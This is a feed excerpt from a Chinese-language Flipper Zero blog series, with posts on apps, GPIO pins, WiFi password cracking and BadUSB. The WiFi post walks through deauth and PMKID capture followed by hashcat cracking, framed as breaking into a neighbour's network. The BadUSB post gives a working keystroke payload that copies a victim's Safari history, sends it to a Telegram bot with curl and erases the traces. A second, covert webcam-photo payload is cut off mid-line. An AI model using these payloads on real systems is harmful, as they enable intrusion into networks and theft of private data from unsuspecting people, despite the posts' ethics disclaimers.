模擬鍵盤，如下：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://images.archbee.com/3StCFqarJkJQZV-7N79yY/A2XqnQaT8o8QHsnWmT21E_flipper-zero-new-keyboard.png?format=webp&width=1280"                      alt="keyboard"                ><br>圖片來源：<a class="link"   href="https://docs.flipper.net/apps" >https://docs.flipper.net/apps <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>Ctrl、Cmd 等有點像是 toggle button 可以幫助我們按出組合鍵。</p><h3 id="Controlling-media-players"><a href="#Controlling-media-players" class="headerlink" title="Controlling media players"></a>Controlling media players</h3><p>我們也可以控制音訊如下：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://images.archbee.com/3StCFqarJkJQZV-7N79yY/7lSxCh1n_rAXNpoGUYP2Y_monosnap-miro-2023-08-07-14-49-54.jpg?format=webp&width=1280"                      alt="media"                ><br>圖片來源：<a class="link"   href="https://docs.flipper.net/apps" >https://docs.flipper.net/apps <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>這邊看到有很多個類似的功能但實測起來差別不大。</p><h3 id="Taking-photos-and-recording-videos"><a href="#Taking-photos-and-recording-videos" class="headerlink" title="Taking photos and recording videos"></a>Taking photos and recording videos</h3><p>然後透過 media 我們也可以控制拍照跟錄影，按鈕對應功能如下：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://images.archbee.com/3StCFqarJkJQZV-7N79yY/Rq5mWz7ZKpJrnr_mdzUzt_monosnap-miro-2023-08-07-14-52-24.jpg?format=webp&width=1280"                      alt="photo"                ><br>圖片來源：<a class="link"   href="https://docs.flipper.net/apps" >https://docs.flipper.net/apps <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="Emulating-a-computer-mouse"><a href="#Emulating-a-computer-mouse" class="headerlink" title="Emulating a computer mouse"></a>Emulating a computer mouse</h3><p>我們也可以模擬滑鼠鼠標：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://images.archbee.com/3StCFqarJkJQZV-7N79yY/SEQwT8AUfEFIU6V31WfhT_monosnap-miro-2023-08-07-14-53-33.jpg?format=webp&width=1280"                      alt="mouse"                ><br>圖片來源：<a class="link"   href="https://docs.flipper.net/apps" >https://docs.flipper.net/apps <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="Keeping-your-computer-from-sleeping"><a href="#Keeping-your-computer-from-sleeping" class="headerlink" title="Keeping your computer from sleeping"></a>Keeping your computer from sleeping</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://images.archbee.com/3StCFqarJkJQZV-7N79yY/S7CtACzj1Z5i5UkYSbvGx_monosnap-miro-2023-08-07-14-55-51.jpg?format=webp&width=1280"                      alt="jiggler"                ><br>這個功能是可以模擬一些滑鼠的行為讓螢幕不要進入睡眠，個人覺得沒那麼實用。</p><h3 id="Mouse-Clicker"><a href="#Mouse-Clicker" class="headerlink" title="Mouse Clicker"></a>Mouse Clicker</h3><p>但是這個就有趣了，可以模擬滑鼠點擊，上限是一秒六十下<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/click.png"                      alt="click"                ><br>歡迎大家去找朋友挑戰，網站是這個：<br><a class="link"   href="https://www.arealme.com/click-speed-test/zh/" >https://www.arealme.com/click-speed-test/zh/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="按讚訂閱收藏小鈴噹叮叮叮"><a href="#按讚訂閱收藏小鈴噹叮叮叮" class="headerlink" title="按讚訂閱收藏小鈴噹叮叮叮"></a>按讚訂閱收藏小鈴噹叮叮叮</h2><p>OK 歡迎各位去探索更多有趣的 app，或是自己開發也是很有趣也很有挑戰性的，大家明天見！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Apps&quot;&gt;&lt;a href=&quot;#Apps&quot; class=&quot;headerlink&quot; title=&quot;Apps&quot;&gt;&lt;/a&gt;Apps&lt;/h2&gt;&lt;p&gt;&lt;img  
                     lazyload
                     src=</summary>
      
    
    
    
    
    <category term="flipper-zero" scheme="https://kazma.tw/tags/flipper-zero/"/>
    
    <category term="iThome" scheme="https://kazma.tw/tags/iThome/"/>
    
    <category term="toy" scheme="https://kazma.tw/tags/toy/"/>
    
  </entry>
  
  <entry>
    <title>Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day21 - 一板在手，WiFi 我有：透過 Flipper 輕鬆破解鄰居家的 WiFi！</title>
    <link href="https://kazma.tw/2024/10/06/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day21-%E4%B8%80%E6%9D%BF%E5%9C%A8%E6%89%8B%EF%BC%8CWiFi-%E6%88%91%E6%9C%89%EF%BC%9A%E9%80%8F%E9%81%8E-Flipper-%E8%BC%95%E9%AC%86%E7%A0%B4%E8%A7%A3%E9%84%B0%E5%B1%85%E5%AE%B6%E7%9A%84-WiFi%EF%BC%81/"/>
    <id>https://kazma.tw/2024/10/06/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day21-%E4%B8%80%E6%9D%BF%E5%9C%A8%E6%89%8B%EF%BC%8CWiFi-%E6%88%91%E6%9C%89%EF%BC%9A%E9%80%8F%E9%81%8E-Flipper-%E8%BC%95%E9%AC%86%E7%A0%B4%E8%A7%A3%E9%84%B0%E5%B1%85%E5%AE%B6%E7%9A%84-WiFi%EF%BC%81/</id>
    <published>2024-10-06T10:36:03.582Z</published>
    <updated>2024-10-06T10:37:02.350Z</updated>
    
    <content type="html"><![CDATA[<h2 id="WiFi-Dev-Board"><a href="#WiFi-Dev-Board" class="headerlink" title="WiFi Dev Board"></a>WiFi Dev Board</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://m.media-amazon.com/images/I/71ju7+bQ5hL._AC_SL1500_.jpg"                      alt="cover"                ><br>圖片來源：<a class="link"   href="https://www.amazon.com/-/zh_TW/%E9%81%A9%E7%94%A8%E6%96%BC-Flipper-Zero-WiFi-%E9%96%8B%E7%99%BC%E6%9D%BF/dp/B0BBWHS5R1" >https://www.amazon.com/-/zh_TW/%E9%81%A9%E7%94%A8%E6%96%BC-Flipper-Zero-WiFi-%E9%96%8B%E7%99%BC%E6%9D%BF/dp/B0BBWHS5R1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天開始要來介紹大家最常購買的配件之一 Wifi 開發板以及他的一些應用，如果大家預算足夠的話，也建議各位買一塊來玩玩，如果對硬體比較熟悉的朋友們也可以嘗試去其他的地方買材料來自己做各種功能的板子，或是不知道官方的板板有什麼可以玩的話，那不妨就先來看看我這幾天的介紹吧～</p><h2 id="資安倫理宣導"><a href="#資安倫理宣導" class="headerlink" title="資安倫理宣導"></a>資安倫理宣導</h2><p>請注意，透過 Flipper Zero 學習的資訊技術與知識，目的在於提升個人的技術能力和資安意識。我們強烈呼籲大家，絕對不要使用所學知識從事任何違法行為。您的合法使用是我們的期望，也是您自身責任的一部分。</p><h2 id="Flash-WiFi-board"><a href="#Flash-WiFi-board" class="headerlink" title="Flash WiFi board"></a>Flash WiFi board</h2><p>如果你去看網路上許多教學可能都會用一堆很複雜的方式教你怎麼 flash 你的 WiFi 板板，但這邊因為我們使用 Momentum 的韌體，所以我們可以透過這個韌體內建的 app 完成，首先我們到 Menu -&gt; Apps -&gt; GPIO -&gt; ESP -&gt; ESP Flasher -&gt; Quick Flash -&gt; WiFi Dev（根據你板子上的晶片選擇）-&gt; Marauder，就可以透過 Flipper 接 type C 到板子上，就可以 flash 我們要的韌體進去了，如果中間有跳提醒說我們沒有 SD card 是正常的，那不影響我們接下來的操作。</p><h2 id="WiFi-Marauder"><a href="#WiFi-Marauder" class="headerlink" title="WiFi Marauder"></a>WiFi Marauder</h2><p>接著我們就可以到 Menu -&gt; Apps -&gt; GPIO -&gt; ESP -&gt; WiFi Marauder，之後我們首先要滾動到最底下的 Save to flipper sdcard，然後 pcaps 要選 Yes，這樣之後才會把 pcaps 存到 sd card 裡面，至於 logs 的話就看個人，這邊是沒有存。<br>再來我們要做的是先掃描附近的無線存取點 Access Point(AP) 有哪些點選 Scan 選擇 ap。<br>接著我們可以到 List 去看掃到的所有 ap 有哪些，這邊他會給他們每個一個編號，我們找到我們的目標 ap 然後記下他的編號，然後 select 去填入剛剛的 ap 編號，直接填入號碼就可以，例如 select-a8。<br>然後我們到 Sniff 中會看到許多選擇如下：</p><ul><li><strong>Beacon</strong>: 廣播無線網路中存在的信號包，可讓裝置識別和連接到無線網絡。</li><li><strong>Deauth</strong>: 發送去認證訊息以強制無線設備與 AP 斷開連接，用於捕獲重新連接所需的認證資料。</li><li><strong>PMKID</strong>: WPA&#x2F;WPA2-PSK 加密協議中使用的識別碼，可用於破解無線網路密碼。</li><li><strong>Probe</strong>: 無線設備發送的探測請求與響應，用於尋找可用無線網絡。</li><li><strong>Pwn</strong>: 利用捕獲的資訊來獲得對網路的控制或訪問。</li><li><strong>Raw</strong>: 捕獲網路上所有類型的封包，包括未處理的 header 和數據有效載荷。</li><li><strong>BT Skim</strong>: 監聽與捕獲藍牙環境下的信息，評估藍牙裝置的安全性。</li></ul><p>這邊因為我們要嘗試破解 WiFi 密碼，所以我們選擇 pmkid，然後接著我們這邊選 Active(Force Deauth) 去主動送出 deauth 訊號，然後等一小段時間之後，我們就會看到螢幕上開始出現 Received EAPOL。</p><blockquote><p>EAPOL（Extensible Authentication Protocol over LAN）是一種網路協議，全名為「可擴充認證協議超過局域網」。EAPOL 是在 IEEE 802.1X 認證框架中使用的協議，主要用於網路存取控制，尤其是在 Wi-Fi 和有線網路環境中。它允許裝置在提供適當認證（如密碼、數位證書等）後，才能存取網路資源。</p></blockquote><p>接著我們就可以到 qFlipper 的 <code>SD Card/apps_data/marauder/pcaps</code> 去看剛剛的封包，我們把它載下來之後就可以開始破解 WiFi 密碼了。</p><p>再來要介紹一個很酷的專案叫 REDDs-PCAP-Uploader，他讓我們只需要上傳 pcap 然後他們爆破到密碼之後就會寄信給我們了。<br><a class="link"   href="https://github.com/InfoSecREDD/REDDs-PCAP-Uploader" >https://github.com/InfoSecREDD/REDDs-PCAP-Uploader <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>那當然我們也可以用傳統的方式，用 hashcat 搭配 rockyou 去爆破，不過我們要先把 pcap 轉成 hashcat 可以用的檔案格式，所以可以到 <a class="link"   href="https://hashcat.net/cap2hashcat/" >https://hashcat.net/cap2hashcat/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 線上轉換，接著就可以用 hashcat 嘗試爆破 wifi 密碼了。</p><h2 id="按讚訂閱收藏小鈴噹叮叮叮"><a href="#按讚訂閱收藏小鈴噹叮叮叮" class="headerlink" title="按讚訂閱收藏小鈴噹叮叮叮"></a>按讚訂閱收藏小鈴噹叮叮叮</h2><p>OK 今天是很快的帶過用 Flipper 爆破 WiFi 密碼的方式，明天我們會有更多的實際操作和背後的理論探討，大家明天見～</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://youtu.be/nKcwJodcOTA?si=iLilh6PnJog3l6Y3" >https://youtu.be/nKcwJodcOTA?si=iLilh6PnJog3l6Y3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;WiFi-Dev-Board&quot;&gt;&lt;a href=&quot;#WiFi-Dev-Board&quot; class=&quot;headerlink&quot; title=&quot;WiFi Dev Board&quot;&gt;&lt;/a&gt;WiFi Dev Board&lt;/h2&gt;&lt;p&gt;&lt;img  
               </summary>
      
    
    
    
    
    <category term="flipper-zero" scheme="https://kazma.tw/tags/flipper-zero/"/>
    
    <category term="iThome" scheme="https://kazma.tw/tags/iThome/"/>
    
    <category term="toy" scheme="https://kazma.tw/tags/toy/"/>
    
  </entry>
  
  <entry>
    <title>Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day20 - 控制與創造：Flipper Zero GPIO 帶來的無限領域</title>
    <link href="https://kazma.tw/2024/10/04/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day20-%E6%8E%A7%E5%88%B6%E8%88%87%E5%89%B5%E9%80%A0%EF%BC%9AFlipper-Zero-GPIO-%E5%B8%B6%E4%BE%86%E7%9A%84%E7%84%A1%E9%99%90%E9%A0%98%E5%9F%9F/"/>
    <id>https://kazma.tw/2024/10/04/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day20-%E6%8E%A7%E5%88%B6%E8%88%87%E5%89%B5%E9%80%A0%EF%BC%9AFlipper-Zero-GPIO-%E5%B8%B6%E4%BE%86%E7%9A%84%E7%84%A1%E9%99%90%E9%A0%98%E5%9F%9F/</id>
    <published>2024-10-04T13:52:22.885Z</published>
    <updated>2024-10-04T13:52:50.514Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GPIO-modules"><a href="#GPIO-modules" class="headerlink" title="GPIO &amp; modules"></a>GPIO &amp; modules</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.flipperzero.one/GPIO_01_1.png"                      alt="cover"                ><br>圖片來源：<a class="link"   href="https://docs.flipper.net/gpio-and-modules" >https://docs.flipper.net/gpio-and-modules <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>到目前為止我們已經把 Flipper 內建的協議和功能都大致跑過一遍了，今天我們要來介紹官方文件中 GPIO &amp; modules 這部分。我們可以透過 Flipper 進行內建的 GPIO 針腳連接到硬體，使用按鈕控制硬體，執行特定的程式碼，並在螢幕上顯示除錯的資訊，也可以用作 USB 到 UART&#x2F;SPI&#x2F;I2C 轉換器。<br>今天就來深入的了解一下這部分吧。</p><h2 id="資安倫理宣導"><a href="#資安倫理宣導" class="headerlink" title="資安倫理宣導"></a>資安倫理宣導</h2><p>請注意，透過 Flipper Zero 學習的資訊技術與知識，目的在於提升個人的技術能力和資安意識。我們強烈呼籲大家，絕對不要使用所學知識從事任何違法行為。您的合法使用是我們的期望，也是您自身責任的一部分。</p><h2 id="GPIO-pinout"><a href="#GPIO-pinout" class="headerlink" title="GPIO pinout"></a>GPIO pinout</h2><p>Flipper 的上面總共有 18 個 pins，包含 power supply 跟 I&#x2F;O pins，Power supply 可以用來為我們的外接設備供電，Input&#x2F;Output pins 都可容忍 3.3 伏特。I&#x2F;O 針腳透過 51 歐姆電阻將外部模組連接到 STM32WB55 微控制器的 I&#x2F;O 針腳。所有針腳都具有靜電放電（ESD）保護。關於 Flipper Zero 針腳的基本功能資訊，可以參可下面的圖片：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://images.archbee.com/3StCFqarJkJQZV-7N79yY/rDj495vJHGg8Ae5H_4vdo_image.png?format=webp&width=1280"                      alt="pins"                ><br>圖片來源：<a class="link"   href="https://docs.flipper.net/gpio-and-modules" >https://docs.flipper.net/gpio-and-modules <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>更細節的針腳功能介紹可以參考下圖：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://images.archbee.com/3StCFqarJkJQZV-7N79yY/zRucuAM1fjos-_rn5VdBb_flipperzeropinout.jpg?format=webp&width=1280"                      alt="color"                ><br>圖片來源：<a class="link"   href="https://docs.flipper.net/gpio-and-modules" >https://docs.flipper.net/gpio-and-modules <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>DFU 模式下的配置表格，可以到官方文件參考：<br><a class="link"   href="https://docs.flipper.net/gpio-and-modules#miFsS" >https://docs.flipper.net/gpio-and-modules#miFsS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="3-3-V-power-pin-9"><a href="#3-3-V-power-pin-9" class="headerlink" title="+3.3 V power (pin 9)"></a>+3.3 V power (pin 9)</h3><p>預設輸出是開啟的，最大容量是 1.2 安培，Flipper 的 microSD 就是用 +3.3 V 供電的，在韌體更新或是 microSD 在掛載的過程，第九腳味的電源供應會暫時中斷。<br>特別注意如古我們要連接容量比較大的外部模組時要把 Flipper 關機，否則 microSD 內的資料有可能會損毀。</p><h3 id="5-V-power-pin-1"><a href="#5-V-power-pin-1" class="headerlink" title="+5 V power (pin 1)"></a>+5 V power (pin 1)</h3><p>第一腳位可以用內建電池供電或是 USB 線，如果 Flipper 有連接著 USB 線的話，那第一腳味的電量就是從 USB 來，但不會超過 1.2 A。<br>當 Flipper 是用內建電池供電的時候：<br>輸出預設是沒有開的，如果要啟用第一腳位的供電的話，要按照下列步驟操作：</p><ol><li>Menu -&gt; GPIO。</li><li>選擇 GPIO 上的 5V 並將其設置為開啟 (ON)。</li></ol><h3 id="Input-output-pins"><a href="#Input-output-pins" class="headerlink" title="Input&#x2F;output pins"></a>Input&#x2F;output pins</h3><p>從 I&#x2F;O 腳位的總功耗不得超過 5 瓦。否則電池可能會切換到保護模式，而 Flipper Zero 可能會關機。每個腳位最多可提供 20 毫安的電流。</p><h3 id="3-3-V-and-5-V-tolerance"><a href="#3-3-V-and-5-V-tolerance" class="headerlink" title="3.3 V and 5 V tolerance"></a>3.3 V and 5 V tolerance</h3><p>現代 CMOS 晶片的 I&#x2F;O 介面設計為在特定電壓範圍內運作。在 Flipper Zero 的 STM32WB55 MCU 的情況下，其 I&#x2F;O 介面設計為使用 3.3 V 電壓運作。</p><h2 id="GPIO-menu"><a href="#GPIO-menu" class="headerlink" title="GPIO menu"></a>GPIO menu</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://images.archbee.com/3StCFqarJkJQZV-7N79yY/SnlXP2zIsJppwcA-JvIlx_monosnap-miro-2023-10-16-12-16-56.jpg?format=webp&width=1280"                      alt="menu"                ><br>圖片來源：<a class="link"   href="https://docs.flipper.net/gpio-and-modules" >https://docs.flipper.net/gpio-and-modules <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>在 GPIO 的菜單中，我們可以設定 USB-UART 的功能，分開測試腳位，然後開關對第一腳位的 5V 供電。</p><h2 id="Inserting-an-external-module"><a href="#Inserting-an-external-module" class="headerlink" title="Inserting an external module"></a>Inserting an external module</h2><p>這邊有個小提醒是插入模組的時候記得插緊：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://images.archbee.com/3StCFqarJkJQZV-7N79yY/41QY2Jt8T1HdJi2zTBxze_howtomodule01.png?format=webp&width=1280"                      alt="demo"                ><br>圖片來源：<a class="link"   href="https://docs.flipper.net/gpio-and-modules" >https://docs.flipper.net/gpio-and-modules <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://images.archbee.com/3StCFqarJkJQZV-7N79yY/LYn2YW09_wPb7kffiGjWh_howtomodule02-1-1.png?format=webp&width=1280"                      alt="demos"                ><br>圖片來源：<a class="link"   href="https://docs.flipper.net/gpio-and-modules" >https://docs.flipper.net/gpio-and-modules <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>聽說很多人買了非官方的殼之後發現上面太厚導致 GPIO 都感應不良，只能把殼拔掉才能正常使用 GPIO 的功能。</p><h2 id="按讚訂閱收藏小鈴噹叮叮叮"><a href="#按讚訂閱收藏小鈴噹叮叮叮" class="headerlink" title="按讚訂閱收藏小鈴噹叮叮叮"></a>按讚訂閱收藏小鈴噹叮叮叮</h2><p>今天我們介紹了有關 Flipper 上面那些腳位的一些小知識，明天開始我們會來玩我們的 Wifi 板板，有許多有趣的功能包括破解 Wifi 密碼以及 Evil Portal 等有趣應用，各位明天見，敬請期待！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;GPIO-modules&quot;&gt;&lt;a href=&quot;#GPIO-modules&quot; class=&quot;headerlink&quot; title=&quot;GPIO &amp;amp; modules&quot;&gt;&lt;/a&gt;GPIO &amp;amp; modules&lt;/h2&gt;&lt;p&gt;&lt;img  
           </summary>
      
    
    
    
    
    <category term="flipper-zero" scheme="https://kazma.tw/tags/flipper-zero/"/>
    
    <category term="iThome" scheme="https://kazma.tw/tags/iThome/"/>
    
    <category term="toy" scheme="https://kazma.tw/tags/toy/"/>
    
  </entry>
  
  <entry>
    <title>Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day19 - 1、2、3、笑一個！用 BadUSB 捕捉你朋友燦爛的笑容！</title>
    <link href="https://kazma.tw/2024/10/04/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day19-1%E3%80%812%E3%80%813%E3%80%81%E7%AC%91%E4%B8%80%E5%80%8B%EF%BC%81%E7%94%A8-BadUSB-%E6%8D%95%E6%8D%89%E4%BD%A0%E6%9C%8B%E5%8F%8B%E7%87%A6%E7%88%9B%E7%9A%84%E7%AC%91%E5%AE%B9%EF%BC%81/"/>
    <id>https://kazma.tw/2024/10/04/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day19-1%E3%80%812%E3%80%813%E3%80%81%E7%AC%91%E4%B8%80%E5%80%8B%EF%BC%81%E7%94%A8-BadUSB-%E6%8D%95%E6%8D%89%E4%BD%A0%E6%9C%8B%E5%8F%8B%E7%87%A6%E7%88%9B%E7%9A%84%E7%AC%91%E5%AE%B9%EF%BC%81/</id>
    <published>2024-10-03T16:01:46.526Z</published>
    <updated>2024-10-29T08:56:49.754Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天的文章發出去之後就問問戰隊的人有沒有什麼有趣的 BadUSB 應用，於是就有了以下的對話：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/dc_badusb.png"                      alt="dc"                ><br>於是今天會優先來嘗試這些有趣的功能，我們趕緊開始吧。</p><h2 id="資安倫理宣導"><a href="#資安倫理宣導" class="headerlink" title="資安倫理宣導"></a>資安倫理宣導</h2><p>請注意，透過 Flipper Zero 學習的資訊技術與知識，目的在於提升個人的技術能力和資安意識。我們強烈呼籲大家，絕對不要使用所學知識從事任何違法行為。您的合法使用是我們的期望，也是您自身責任的一部分。</p><h2 id="Browser-History"><a href="#Browser-History" class="headerlink" title="Browser History"></a>Browser History</h2><p>首先我們先來嘗試瀏覽紀錄，因為我跟身邊的朋友都比較常用 Mac 所以今天也會先以研究 Mac 為主。<br>首先我們先去找預設瀏覽器 Safari 的瀏覽紀錄放在哪裡，經過搜尋後發現在 <code>/Users/$username/Library/Safari/History.db</code>，我們把它複製到 <code>/tmp/history.db</code> 方便我們執行後續操作，然後用 sqlite3 執行 <code>select url from history_items</code> 到一個新的 txt，接著我們就把它傳給我們的 tg bot 然後刪除所有痕跡之後用 command + q 關掉 terminal。<br>結果在測試的時候發現我的 terminal 權限不夠會發生以下的錯誤：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╰─ sqlite3 ~/Library/Safari/History.db &quot;SELECT url FROM history_visits JOIN history_items ON history_items.id = history_visits.history_item ORDER BY visit_time DESC LIMIT 10;&quot;</span><br><span class="line">Error: unable to open database &quot;/Users/kingkazma/Library/Safari/History.db&quot;: unable to open database file</span><br></pre></td></tr></table></figure></div><p>但是我的 iTerm 因為時常在執行怪怪的事情所以那邊反而是可以執行的，所以這邊改成開 iTerm 來執行腳本，腳本如下：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">REM Open Spotlight</span><br><span class="line">GUI SPACE</span><br><span class="line">DELAY 500</span><br><span class="line">STRING iterm</span><br><span class="line">DELAY 500</span><br><span class="line">ENTER</span><br><span class="line">DELAY 1000</span><br><span class="line">GUI T</span><br><span class="line">DELAY 500</span><br><span class="line"></span><br><span class="line">REM Define the username and copy the Safari history to a temporary file</span><br><span class="line">STRING export username=$(whoami)</span><br><span class="line">ENTER</span><br><span class="line">STRING cp /Users/$username/Library/Safari/History.db /tmp/history.db</span><br><span class="line">ENTER</span><br><span class="line"></span><br><span class="line">REM Export history from the database to a plain text file</span><br><span class="line">STRING sqlite3 /tmp/history.db &quot;select url from history_items&quot; &gt; /Users/$username/Desktop/safari_history.txt</span><br><span class="line">ENTER</span><br><span class="line"></span><br><span class="line">REM Send the history file to Telegram</span><br><span class="line">STRING curl -s -X POST -F &quot;chat_id=&lt;your_chat_id&gt;&quot; -F document=@&quot;/Users/$username/Desktop/safari_history.txt&quot; https://api.telegram.org/bot&lt;your_token&gt;/sendDocument</span><br><span class="line">ENTER</span><br><span class="line">DELAY 1000</span><br><span class="line"></span><br><span class="line">REM Clean up temporary files</span><br><span class="line">STRING rm /tmp/history.db</span><br><span class="line">ENTER</span><br><span class="line">STRING rm /Users/$username/Desktop/safari_history.txt</span><br><span class="line">ENTER</span><br><span class="line"></span><br><span class="line">REM Close Terminal</span><br><span class="line">DELAY 5000</span><br><span class="line">GUI Q</span><br><span class="line">ENTER</span><br></pre></td></tr></table></figure></div><p>然後我都習慣打開終端或是瀏覽器之後開一個新分頁是因為有時候受害者的應用程式已經打開的話腳本就有機會出錯，所以儘量讓這些參數都一樣成功率比較高，執行結果：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/safari_history.png"                      alt="history"                ><br>成功收到瀏覽紀錄了。</p><h2 id="Camera"><a href="#Camera" class="headerlink" title="Camera"></a>Camera</h2><p>接著想要嘗試幫受害者照張相行不行得通，首先研究蘋果用終端拍照的方是主要有兩種，一種是透過內建的 AppleScript 對 Photo Booth 操作，另外一種是透過 brew 下載 imagesnap，但要下載就會有比較難估計的等待時間，所以這邊嘗試用內建功能來完成。<br>研究了之後發現 photo booth 是可以透過 enter 來觸發快門的，所以我們的腳本最後寫完如下：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">REM Open Spotlight</span><br><span class="line">GUI SPACE</span><br><span class="line">DELAY 500</span><br><span class="line">REM Type &#x27;iTerm&#x27; to open iTerm</span><br><span class="line">STRING iTerm</span><br><span class="line">DELAY 500</span><br><span class="line">ENTER</span><br><span class="line">DELAY 1000</span><br><span class="line">GUI T</span><br><span class="line">DELAY 500</span><br><span class="line"></span><br><span class="line">REM Use AppleScript to activate Photo Booth and take a photo</span><br><span class="line">STRING osascript -e &#x27;tell application &quot;Photo Booth&quot; to activate&#x27; -e &#x27;delay 2&#x27; -e &#x27;tell application 